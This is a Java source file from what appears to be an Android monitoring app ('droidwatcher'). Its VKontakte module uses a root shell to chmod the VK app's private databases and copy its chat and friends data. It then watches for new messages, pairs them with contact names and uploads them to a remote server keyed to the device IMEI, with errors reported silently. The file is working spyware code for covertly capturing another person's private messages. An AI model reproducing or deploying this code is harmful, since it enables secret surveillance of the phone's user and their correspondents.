package com.droidwatcher.modules.vk;

import java.util.ArrayList;
import java.util.Date;

import org.acra.ACRA;

import com.droidwatcher.Debug;
import com.droidwatcher.ServerMessanger;
import com.droidwatcher.lib.FileUtil;
import com.droidwatcher.lib.IMessageBody;
import com.droidwatcher.lib.MessageType;
import com.droidwatcher.lib.IMMessage;
import com.droidwatcher.variables.ServerMessage;
import com.stericson.RootTools.RootTools;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.preference.PreferenceManager;

@SuppressLint("SdCardPath")
public class VkModule_old extends VkModuleBase {
	private static final String PATH_CHATS = "/data/data/com.vkontakte.android/databases/chats.db";
	private static final String PATH_FRIENDS = "/data/data/com.vkontakte.android/databases/friends.db";
	private static final String[] FRIENDS_COLUMNS = new String[] {"firstname", "lastname"};
	
	private String LOCAL_PATH_CHATS = "";
	private String LOCAL_PATH_FRIENDS = "";
	
	public VkModule_old(Context context) {
		super(context);
		
		LOCAL_PATH_CHATS = FileUtil.getFullPath(context, "chats.db");
		LOCAL_PATH_FRIENDS = FileUtil.getFullPath(context, "friends.db");
	}
	
	@Override
	public synchronized void start() {
		MyCommandCapture command = new MyCommandCapture(
				"chmod 777 /data/data/com.vkontakte.android/databases/*",
				"cat " + PATH_FRIENDS + " > " + LOCAL_PATH_FRIENDS,
				"cat " + PATH_CHATS + " > " + LOCAL_PATH_CHATS,
				"chmod 777 " + FileUtil.getFullPath(mContext, "*"));
			
		command.setCallback(new ICommandCallback() {
			@Override
			public void run() {
				SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(mContext);
				mLastMsgTimestamp = settings.getLong(SETTINGS_LASTDATE, getLastUpdate());
				mFileObserver = new VkFileObserver(PATH_CHATS);
				
				Debug.i("[VkModule_old] Start watching");
				mFileObserver.startWatching();
				
				mIsStarted = true;
			}
		});
		
		try {
			RootTools.getShell(true).add(command);
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}

	@Override
	public synchronized void stop() {
		mIsStarted = false;
		
		try {
			saveLastMsgTimestamp(mLastMsgTimestamp);
			mFileObserver.stopWatching();
			mFileObserver = null;
			
		} catch (Exception e) {
			Debug.exception(e);
			
		} finally {
			mFileObserver = null;
		}
	}

	@Override
	protected synchronized void getNewChat(){
		MyCommandCapture command = new MyCommandCapture("cat " + PATH_CHATS + " > " + LOCAL_PATH_CHATS);
		
		command.setCallback(new ICommandCallback() {
			@Override
			public void run() {
				SQLiteDatabase db = null;
				
				try {
					db = SQLiteDatabase.openDatabase(LOCAL_PATH_CHATS, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
					ArrayList<Integer> chats = getUpdatedChats(db);
					if (chats == null || chats.size() == 0) {
						return;
					}
					
					ArrayList<IMessageBody> list = new ArrayList<IMessageBody>();
					for (Integer id : chats) {
						list.addAll(getMessages(id, db));
					}
					
					final long lastMsgTimestamp = mLastMsgTimestamp;
					mLastMsgTimestamp = getLastMsgTimestamp(db);
					
					db.close();
					db = null;
					
					if (list != null && list.size() > 0 && networkAvailable()) {
						new ServerMessanger(
							mContext,
							new ServerMessage(MessageType.VK, mSettings.imei(), mSettings.login(), list),
							new ServerMessanger.ICallBack() {
								@Override
								public boolean onFinished(String response) { return false; }

								@Override
								public void onError() {
									mLastMsgTimestamp = lastMsgTimestamp;
								}

								@Override
								public void onSuccess() {
									saveLastMsgTimestamp(mLastMsgTimestamp);
								}
							}
						).start();
					}
				} catch (Exception e) {
					Debug.exception(e);
					ACRA.getErrorReporter().handleSilentException(e);
					
				} finally {
					if (db != null && db.isOpen()) {
						db.close();
					}
				}
			}
		});
		
		try{
			RootTools.getShell(true).add(command);
			
		} catch(Exception e){
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	private ArrayList<IMessageBody> getMessages(Integer id, SQLiteDatabase db){
		Cursor c = null;
		try {
			ArrayList<IMessageBody> messages = new ArrayList<IMessageBody>();
			c = db.query("chat" + id, new String[] {"sender", "text", "time"}, "time > " + mLastMsgTimestamp, null, null, null, null);
			while (c.moveToNext()) {
				int sender = c.getInt(0);
				String text = c.getString(1);
				long date = c.getLong(2) * 1000;
				
				messages.add(new IMMessage(date, text, getUserName(id), sender == id ? 1 : 2));
			}
			
			return messages;
			
		} catch(Exception e){
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			return null;
			
		} finally {
			if (c != null) {
				c.close();
			}
		}
	}
	
	private ArrayList<Integer> getUpdatedChats(SQLiteDatabase db){
		Cursor c = null;
		try {
			ArrayList<Integer> chats = new ArrayList<Integer>();
			c = db.query("stats", new String[] {"peer"}, "last_update > " + mLastMsgTimestamp, null, null, null, null);
			while (c.moveToNext()) {
				chats.add(c.getInt(0));
			}
			
			return chats;
			
		} catch(Exception e){
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			return null;
			
		} finally {
			if (c != null) {
				c.close();
			}
		}
	}
	
	private synchronized String getUserName(int uid){
		if (mUsernames.get(uid) != null) {
			return mUsernames.get(uid);
		}
		
		SQLiteDatabase db = null;
		Cursor c = null;
		try {
			db = SQLiteDatabase.openDatabase(LOCAL_PATH_FRIENDS, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
			c = db.query("friendlist",  FRIENDS_COLUMNS, "uid = ?", new String[] { String.valueOf(uid) }, null, null, null);
			if (c.getCount() != 1) {
				return "Unknown";
			}
			
			if (c.moveToFirst()) {
				String username = c.getString(c.getColumnIndex("firstname")) + " " + c.getString(c.getColumnIndex("lastname"));
				mUsernames.put(uid, username);
				return username;
			}
			
			return "Unknown";
			
		} catch(Exception e){
			e.printStackTrace();
			return "Unknown";
			
		} finally {
			if (db != null && db.isOpen()) {
				db.close();
			}
			
			if (c != null) {
				c.close();
			}
		}
	}
	
	private long getLastUpdate(){
		SQLiteDatabase db = null;
		Cursor c = null;
		try {
			db = SQLiteDatabase.openDatabase(LOCAL_PATH_CHATS, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
			c = db.rawQuery("SELECT MAX(last_update) FROM stats", null);
			c.moveToFirst();
			return c.getLong(0);
			
		} catch(Exception e){
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			return new Date().getTime();
			
		} finally {
			if (db != null && db.isOpen()) {
				db.close();
			}
			
			if (c != null) {
				c.close();
			}
		}
	}
	
	private long getLastMsgTimestamp(SQLiteDatabase db){
		Cursor c = null;
		try {
			c = db.rawQuery("SELECT MAX(last_update) FROM stats", null);
			c.moveToFirst();
			return c.getLong(0);
			
		} catch(Exception e){
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			return new Date().getTime();
			
		} finally {			
			if (c != null) {
				c.close();
			}
		}
	}
}
